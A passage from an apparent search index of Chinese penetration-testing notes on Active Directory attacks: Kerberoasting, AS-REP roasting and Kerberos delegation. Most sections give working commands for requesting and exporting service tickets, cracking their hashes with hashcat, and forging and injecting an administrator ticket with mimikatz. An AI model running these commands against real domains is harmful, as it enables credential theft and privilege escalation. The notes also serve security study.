\u7684\u5e10\u6237\u7684\u54c8\u5e0c\u52a0\u5bc6\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u4ee5\u79bb\u7ebf\u7834\u89e3\u8fd9\u4e2a\u52a0\u5bc6\u5757\uff0c\u6062\u590d\u5e10\u6237\u7684\u660e\u6587\u5bc6\u7801","title":"kerberoast"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-get-spn","text":"\u5982\u4f55\u5f97\u5230\u57df\u4e2d\u7684\u6240\u6709SPN\uff1f 1.setspn \u5f88\u7b80\u5355\uff0c\u53ea\u9700\u6267\u884c setspn -q */* \u5373\u53ef 2.kerberoast\u5de5\u5177\u96c6\u7684GetUserSpns powershell\u811a\u672c","title":"How to get SPN"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-get-hash","text":"\u5982\u4f55\u5f97\u5230hash\uff1f \u6709\u5982\u4e0b\u65b9\u6cd5 1.Rubeus.exe \u8fd9\u4e2a\u5de5\u5177github\u4e0a\u5c31\u6709\uff0c\u4f46\u662fclone\u4e0b\u6765\u540e\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u6210exe. \u7136\u540e\u6267\u884c Rubeus.exe kerberoast\u6307\u4ee4\u5373\u53ef 2.mimikatz mimikatz\u771f\u7684\u795e\u5668\u3002 \u901a\u8fc7\u547d\u4ee4 kerberos::ask /target:\u4f60\u6240\u6307\u5b9a\u7684SPN, \u5373\u53ef\u901a\u8fc7\u8ba4\u8bc1\u7684\u65b9\u5f0f\u5f97\u5230\u4e00\u4e2aST\u3002 \u7136\u540e\u6211\u4eec\u5728kerberos::list\u91cc\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u60f3\u8981\u7684ST 3.powershell \u8d8a\u6765\u8d8a\u53d1\u73b0powershell\u5728\u57df\u6e17\u900f\u4e2d\u7684\u91cd\u8981\u6027\u4e86 \u8f93\u5165\u4ee5\u4e0b\u6307\u4ee4\uff0c\u5373\u53ef\u5b8c\u6210HASH\u83b7\u53d6 Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MySQL/win7.xie.com:3306/MySQL\" \u7136\u540emimikatz\u5bfc\u51fa\u5373\u53ef","title":"How to get HASH"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-export-hash","text":"\u83b7\u5f97\u4e86ST\u7968\u636e\uff0c\u4f46\u600e\u4e48\u5bfc\u51fa\uff1f 1.mimikatz \u5bfc\u51fa\u6240\u6709\u7968\u636e \u53ef\u4ee5\u53d1\u73b0\u751f\u6210\u4e86kirbi\u6587\u4ef6\u3002\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u9700\u8981\u7684hash\u4e86 2.Empire Powershell \u6846\u67b6 github: https://github.com/EmpireProject/Empire \u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u6846\u67b6\u53ef\u4ee5\u5bfc\u51fahashcat\u683c\u5f0f\u7684hash. Import-Module .\\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat","title":"How to export hash"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-crack-hash","text":"\u5982\u4f55\u7834\u89e3HASH? 1.HASHCAT \u8fd9\u4e2a\u5de5\u5177\u9700\u8981\u8ba9hash\u683c\u5f0f\u4e3ahashcat\u6a21\u5f0f\u624d\u80fd\u8fdb\u884c\u7834\u89e3\u3002kribi\u6587\u4ef6\u4e0d\u80fd\u653e\u5165hashcat\u8fdb\u884c\u7834\u89e3. hashcat -m 13110 pass.txt hash.txt 2.kerberoast\u4e2d\u7684tgsrepcrack.py \u652f\u6301kribi\u6587\u4ef6\u7834\u89e3 python3 tgsrepcrack.py pass.txt xxx.kribi","title":"How to crack HASH"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-use-kerberoast","text":"\u65e2\u7136\u6211\u4eec\u90fd\u628aST\u7684\u52a0\u5bc6hash\u90fd\u7834\u89e3\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u968f\u4fbf\u6539ST\u4e2d\u7684\u7968\u636e\u5185\u5bb9\u4e86..\\ \u8fd9\u91cc\u4f7f\u7528\u7684\u662fkerberoast\u5de5\u5177\u96c6\u91cc\u7684kerberoast.py python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500 python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512 ## \u5c06\u7968\u636e\u6743\u9650\u6539\u4e3aadministrator kerberos::ptt PENTESTLAB.kirbi #\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58","title":"How to use Kerberoast"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#as_rep-roast","text":"\u8f83Kerberoast\u6765\u8bf4\uff0c\u6bd4\u8f83\u9e21\u808b\u3002 \u5b83\u7684\u539f\u7406\u662f\u5728\u4e0d\u5f00\u542fkerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u7684\u524d\u63d0\u4e0b\uff0c\u83b7\u5f97\u5176\u4ed6\u7528\u6237\u7684AS_RES\uff0c\u5e76\u7834\u89e3\u52a0\u5bc6session key \u7684 client hash\u3002","title":"AS_REP Roast"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-get-hash_1","text":"1.Rubeus Rubeus.exe asreproast \u7136\u540e\u5c31\u4f1a\u641c\u7d22\u57df\u4e2d\u4e0d\u9700\u8981kerberos\u9884\u9a8c\u8bc1\u7684\u7528\u6237\uff0c\u5e76\u83b7\u5f97ASREP\u3002 2.Empire\u6846\u67b6\u4e0e ASREPRoast.ps1 \u4f7f\u7528Empire\u6846\u67b6\u4e0b\u7684powerview.ps1\u67e5\u627e\u57df\u4e2d\u8bbe\u7f6e\u4e86 \u201c\u4e0d\u9700\u8981kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u201d \u7684\u7528\u6237 Import-Module .\\powerview.ps1 Get-DomainUser -PreauthNotRequired \u7136\u540e\u7528 ASREPRoast.ps1 \uff1a https://github.com/HarmJ0y/ASREPRoast \u83b7\u53d6\u6307\u5b9a\u7528\u6237\u7684AS-REPhash Import-Module ASREPRoast.ps1 Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt \u5c31\u4f1a\u751f\u6210\u4e00\u4e2ahash\u6570\u636e\u6587\u4ef6\u4e86","title":"How to get HASH"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#how-to-crack-hash_1","text":"\u5c06\u751f\u6210\u7684HASH\u4fdd\u5b58\u8d77\u6765\uff0c\u5e76\u5728\u4e0b\u56fe\u5904\u52a0\u5165\\$23 \u7136\u540e\u4e22\u7ed9hashcat \u8dd1 hashcat -m 18200 hash.txt pass.txt \u6ce8\u610f\u8fd9\u91cc\u7684pass.txt\u662f\u81ea\u5df1\u7684\u660e\u6587\u5b57\u5178\u2026\u4e4b\u524d\u6211\u8fd8\u4e00\u76f4\u4ee5\u4e3a\u662f\u7206\u7834\u51fa\u6765\u7684\u7ed3\u679c. \u539f\u6765\u662f\u4e00\u4e2a\u4e00\u4e2a\u7684\u7528\u660e\u6587\u5b57\u5178\u53bb\u7206\u7834\u3002","title":"How to crack hash"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_3","text":"","title":"\u59d4\u6d3e\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_4","text":"\u57df\u59d4\u6d3e\u662f\u4e00\u79cd\u57df\u5185\u4e3b\u673a\u7684\u884c\u4e3a\uff0c\u4f7f\u67d0\u4e2a\u670d\u52a1\u53ef\u4ee5\u4ee5\u8bbf\u95ee\u7684\u7528\u6237\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u53e6\u5916\u4e00\u4e2a\u670d\u52a1\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u57df\u59d4\u6d3e\u5462\uff0c\u6bd4\u5982\u73b0\u5728\u6709web\u670d\u52a1\u5668\u548c\u6587\u4ef6\u670d\u52a1\u5668\uff0c\u5f53\u7528\u6237A\u8bbf\u95eeweb\u670d\u52a1\u5668\u53bb\u8bf7\u6c42\u67d0\u4e2a\u8d44\u6e90\u65f6\uff0cweb\u670d\u52a1\u5668\u4e0a\u672c\u8eab\u5e76\u6ca1\u6709\u8be5\u8d44\u6e90\uff0c\u6240\u4ee5web\u670d\u52a1\u5668\u5c31\u4f1a\u4ece\u6587\u4ef6\u670d\u52a1\u5668\u4e0a\u8c03\u7528\u8fd9\u4e2a\u8d44\u6e90\uff0c\u5176\u4e2d\u53d1\u751f\u7684\u8fc7\u7a0b\u82e5\u4ee5\u57df\u59d4\u6d3e\u7684\u5f62\u5f0f\u8fdb\u884c\uff0c\u90a3\u4e48\u5c31\u662f\uff1a \u7528\u6237A\u8bbf\u95eeweb\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u518d\u4ee5\u7528\u6237A\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u6587\u4ef6\u670d\u52a1\u5668\u3002 \u53d1\u751f\u57df\u59d4\u6d3e\u7684\u670d\u52a1\u4e00\u822c\u4e3a\u673a\u5668\u8d26\u6237\u548c\u670d\u52a1\u8d26\u6237\u3002 \u57df\u59d4\u6d3e\u5206\u4e3a\u4e09\u79cd\uff1a\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e","title":"\u57df\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_5","text":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u539f\u7406\u662f\uff1a\u7528\u6237\u60f3\u8bbf\u95ee\u670d\u52a1A\uff0c\u4e8e\u662f\u5411KDC\u63d0\u4ea4\u8ba4\u8bc1\uff0cKDC\u53d1\u73b0A\u662f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u4e8e\u662f\u4f1a\u628aTGT\u653e\u5728ST\u4e2d\u4e00\u5e76\u7ed9\u7528\u6237\u3002\u7136\u540e\u7528\u6237\u7528\u8fd9\u4e2aST\u53bb\u8bbf\u95ee\u670d\u52a1A\uff0c\u670d\u52a1A\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86\u7528\u6237\u7684TGT\uff0c\u628aTGT\u653e\u5165lsass\u8fdb\u7a0b\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u62ff\u7740\u7528\u6237\u7684TGT\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u53bb\u8bbf\u95ee\u6240\u6709\u7528\u6237\u6743\u9650\u80fd\u591f\u8bbf\u95ee\u7684\u670d\u52a1\u4e86\u3002 \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u542f\u7528\uff1a \u4e3a\u67d0\u8d26\u6237\u542f\u7528 \u4fe1\u4efb\u6b64\u8ba1\u7b97\u673a\u6765\u59d4\u6d3e\u4efb\u4f55\u670d\u52a1 \u5373\u5f00\u542f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u5f00\u542f\u540e\u5728\u8be5\u7528\u6237\u7684 ACL\u5c5e\u6027\u4f1a\u591a\u51fa\u4e00\u4e2a flag : WORKSTATION_TRUSTED_FOR_DELEGATION (\u56fe\u622a\u4e0d\u5b8c\uff0c\u53cd\u6b63\u8fd9\u4e2aflag\u5c31\u5728\u7bad\u5934\u6240\u6307\u5904\u7684\u540e\u9762) \u975e\u7ea6\u675f\u59d4\u6d3e\u7684\u8bbe\u7f6e\u9700\u8981 SeEnableDelegation \u7279\u6743\uff0c\u8be5\u7279\u6743\u901a\u5e38\u4ec5\u6388\u4e88\u57df\u7ba1\u7406\u5458 \u8fd9\u91cc\u8bf4\u4e2a\u9898\u5916\u8bdd\uff0c\u57df\u63a7\u4e3b\u673a\u9ed8\u8ba4\u662f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e","title":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_6","text":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u662f\u5f88\u4e0d\u5b89\u5168\u7684\uff08\u56e0\u4e3a\u63a7\u5236\u4e86\u5f00\u542f\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u673a\u5668\uff0c\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86\u4e0a\u9762\u7684\u6240\u6709\u5176\u4ed6\u7528\u6237\u7684TGT\uff09\uff0c\u6240\u4ee5\u66f4\u5b89\u5168\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u8bde\u751f\u4e86\u3002 \u7ea6\u675f\u6027\u59d4\u6d3e\u591a\u4e86\u4e24\u4e2a\u59d4\u6d3e\u534f\u8bae\uff0cS4U2SELF S4U2PROXY\uff0c\u5e76\u4e14\u9650\u5236\u4e86\u88ab\u8bbe\u7f6e\u59d4\u6d3e\u7684\u670d\u52a1\u7684\u8bbf\u95ee\u8303\u56f4\uff1a\u4ec5\u80fd\u88ab\u59d4\u6d3e\u5230\u88ab\u6307\u5b9a\u7684\u670d\u52a1\u3002 \u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u5927\u81f4\u6d41\u7a0b\uff1a \u7528\u6237\u8bbf\u95ee\u5f00\u542f\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u670d\u52a1A \uff08\u60c5\u51b5\u4e00\uff1a\u65e0S4U2SELF\u53c2\u4e0e\uff09\u9996\u5148\u9700\u8981\u7ecf\u8fc7KDC\u8ba4\u8bc1\uff0cKDC\u53d1\u73b0\u670d\u52a1A\u5f00\u542f\u4e86\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u4e8e\u662f\u5728TGS_RES\u8fd4\u56de\u7ed9\u7528\u6237ST1\uff08\u53ef\u8f6c\u53d1ST\uff09\uff0c\u7528\u6237\u62ff\u7740ST1\u8bbf\u95ee\u670d\u52a1A\uff0c\u670d\u52a1A\u5148\u4e0eKDC\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u83b7\u5f97\u4e00\u4e2a\u6709\u6548TGT\uff0c\u7136\u540e\u62ff\u7740ST1\u7ecf\u8fc7S4U2PROXY\u534f\u8bae\u5411KDC\u53d1\u8d77TGS_REQ\uff0cKDC\u8fd4\u56deST2\uff08\u7528\u6237\u8eab\u4efd\u7684ST\uff09\uff0c\u7136\u540e\u670d\u52a1A\u62ff\u7740ST2\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1\u3002 \uff08\u60c5\u51b5\u4e8c\uff1a\u6709S4U2SELF\u53c2\u4e0e\uff09\u7528\u6237\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\uff08\u5982NTLM\u8ba4\u8bc1\uff0c\u8868\u5355\u8ba4\u8bc1\u7b49\uff09\u83b7\u53d6\u4e86\u670d\u52a1A\u7684\u4fe1\u4efb\uff0c\u4f46\u662f\u6b64\u65f6\u670d\u52a1A\u5e76\u6ca1\u6709\u6765\u81ea\u7528\u6237\u7684ST1\uff0c\u6309\u60c5\u51b5\u4e00\u4e2d\u7684\u6d41\u7a0b\uff0c\u670d\u52a1A\u5c31\u4e0d\u80fd\u5b8c\u6210\u59d4\u6d3e\u3002\u6240\u4ee5\u8fd9\u4e2a\u65f6\u5019\u670d\u52a1A\u4f1a\u4ee5\u81ea\u5df1\u7684\u8eab\u4efd\u5411KDC\u53d1\u8d77\u7533\u8bf7\u83b7\u53d6\u4e00\u4e2a\u53ef\u8f6c\u53d1TGT\uff08\u83b7\u53d6KDC\u4fe1\u4efb\uff09\uff0c\u7136\u540e\u7528\u8fd9\u4e2aTGT\u53d1\u8d77TGS_REQ\u83b7\u5f97\u6307\u5b9a\u7528\u6237\u7684ST1\uff0c\u65e2\u7136\u83b7\u53d6\u4e86ST1\uff0c\u5c31\u7ee7\u7eed\u60c5\u51b5\u4e00\u4e2d\u7684\u6d41\u7a0b\u5373\u53ef\u4e86\u3002 \u4e5f\u5c31\u662f\u8bf4S4U2SELF\u662f\u7528\u6237\u901a\u8fc7\u975ekerberos\u534f\u8bae\u5b8c\u6210\u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\uff0c\u81ea\u52a8\u5411KDC\u83b7\u53d6ST1\u7684\u4e00\u4e2a\u534f\u8bae\u3002 \u800cS4U2PROXY\u5219\u662f\u5c06ST1\u53d1\u7ed9KDC\uff0c\u4f7f\u5176\u53d8\u73b0\u4e3a\u6210\u81ea\u5df1\u53ef\u7528\u7684 ST2 \u7684\u4e00\u4e2a\u534f\u8bae\u3002 \u542f\u7528\u65b9\u6cd5: \u5176\u4e2d\u88ab\u6dfb\u52a0\u7684\u670d\u52a1\u5219\u662f\u5141\u8bb8\u88ab\u59d4\u6d3e\u5230\u7684\u670d\u52a1 \u82e5\u542f\u7528\u7684\u662f \u4ec5\u4f7f\u7528kerberos\uff0c\u90a3\u4e48useraccountcontrol\u5c5e\u6027\u4ec5\u6709 workstation_trust_account. \u82e5\u542f\u7528\u4efb\u4f55\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u5c31\u4f1a\u6709 TrustedToAuthenticationForDelegation","title":"\u7ea6\u675f\u6027\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_7","text":"Windows Server 2012\u4e2d\u5f15\u5165\u4e86\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u53ea\u80fd\u5728\u8fd0\u884cWindows Server 2012\u6216Windows Server 2012 R2\u53ca\u4ee5\u4e0a\u7684\u57df\u63a7\u5236\u5668\u4e0a\u914d\u7f6e \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff0c\u4e0d\u9700\u8981\u57df\u7ba1\u7406\u5458\u524d\u6765\u8bbe\u7f6e\uff0c\u800c\u628a\u8bbe\u7f6e\u59d4\u6d3e\u7684\u6743\u9650\u4ea4\u7ed9\u4e86\u81ea\u8eab\u3002 \u5176\u5b9e\u5c31\u662f\u53ef\u4ee5\u6446\u8131\u57df\u63a7\u6765\u4e3b\u52a8\u8bbe\u7f6e\u81ea\u5df1\u53ef\u4ee5\u88ab\u54ea\u4e9b\u8d26\u6237\u59d4\u6d3e\u8bbf\u95ee\u3002","title":"\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_8","text":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u6709\u5de8\u5927\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e0a\u9762\u6211\u4eec\u8bf4\u8fc7\uff0c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u5b9e\u8d28\u5c31\u662f\u628a\u7528\u6237\u7684TGT\u5b58\u5165lassa\u8fdb\u7a0b\uff0c\u4ece\u800c\u6a21\u62df\u7528\u6237\u8eab\u4efd\u8fdb\u884c\u5404\u79cd\u59d4\u6d3e\u8bbf\u95ee\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u63a7\u5236\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u7684\u673a\u5668\uff0c\u7136\u540edump\u51fa\u6240\u6709\u7684\u7968\u636e\uff0c\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86\u6240\u6709\u7ecf\u8fc7\u8be5\u670d\u52a1\u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u7528\u6237\u7684\u8eab\u4efd\u4e86\u3002","title":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#1","text":"\u8fd9\u91cc\u63d0\u4e00\u4e0b\u600e\u4e48\u521b\u5efa\u6709SPN\u7684\u670d\u52a1\u8d26\u6237\u3002 \u53ea\u9700\u518d\u57df\u63a7\u91cc\u6267\u884c setspn -U -A spn_type username \u5373\u53ef \u5176\u4e2dspn_type\u5373SPN\u7684\u683c\u5f0f\uff1a MSSQLSvc/:[ | ] MSSQLSvc \u662f\u8981\u6ce8\u518c\u7684\u670d\u52a1\u3002 \u662f\u670d\u52a1\u5668\u7684\u5b8c\u5168\u9650\u5b9a\u57df\u540d\u3002 \u662f TCP \u7aef\u53e3\u53f7\u3002 \u662f SQL Server \u5b9e\u4f8b\u7684\u540d\u79f0\u3002 \u8fd9\u91cc\u6211\u4eec\u968f\u4fbf\u8f93\u4e00\u4e2a\uff0c\u6bd4\u5982 sb/caonima \u8fd9\u79cd\u90fd\u884c. \u8fd9\u91cc\u91c7\u7528powersploit\u4e0b\u7684powerview.ps1 \u6839\u636e\u6211\u7f51\u4e0a\u5f88\u591a\u641c\u7d22\u7ed3\u679c\uff0c\u67e5\u627e\u975e\u7ea6\u675f\u59d4\u6d3e\u670d\u52a1\u8d26\u6237\u53ea\u9700\u8c03\u7528 Get-NetUser -Unconstrained -Domain de1ay.com Get-NetUser -Domain de1ay.com|? {$_.useraccountcontrl -like \"trusted_for_delegation\"} \u8fd9\u4e2a\u547d\u4ee4\u5373\u53ef\uff0c\u4f46\u662f\u6211\u4e0b\u8f7d\u4e0b\u6765\u7684powerview\u91cc\u7684get-netuser\u91cc\u5374\u6ca1\u6709unconstrained\u53c2\u6570\uff0c\u5f88\u70e6\u3002\u6240\u4ee5\u7528\u4e00\u4e2a\u6bd4\u8f83\u539f\u59cb\u7684\u65b9\u6cd5\u6765\u5224\u522b\uff08\u9002\u5408\u5728\u7528\u6237\u5c11\u7684\u60c5\u51b5\u4e0b\uff09 \u76f4\u63a5\u8c03\u7528 Get-NetUser -SPN \u627e\u5230\u6240\u6709\u670d\u52a1\u8d26\u6237\u6216\u8005Get-domaincomputer\u627e\u5230\u6240\u6709\u673a\u5668\u8d26\u6237\uff0c\u7136\u540e\u5224\u65ad\u5176useraccountcontrl\u91cc\u6709\u6ca1\u6709trusted_for_delegation,\u82e5\u6709\uff0c\u5219\u8bf4\u660e\u5f00\u542f\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u67e5\u8be2\u975e\u7ea6\u675f\u59d4\u6d3e\u673a\u5668\u8d26\u6237\u5219\u7528 Get-domaincomputer -unconstrained -domain 